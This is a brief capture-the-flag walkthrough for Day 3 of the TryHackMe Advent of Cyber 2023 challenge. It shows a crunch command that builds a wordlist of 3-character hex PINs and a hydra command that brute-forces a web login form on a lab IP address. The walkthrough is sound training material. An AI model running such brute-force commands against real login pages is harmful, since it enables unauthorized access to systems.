# Advent of Cyber 2023


------------------------------------------------------------

#### Day 3: Brute-forcing - Hydra is Coming to Town

- Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?
	- `THM`

First you need to a list for possible 3 digits combination.
```
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

Then you will navigate to the login page of the site. 
Go to the view source code. 
```
hydra -l '' -P 3digits.txt -f -v 10.10.179.47 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```
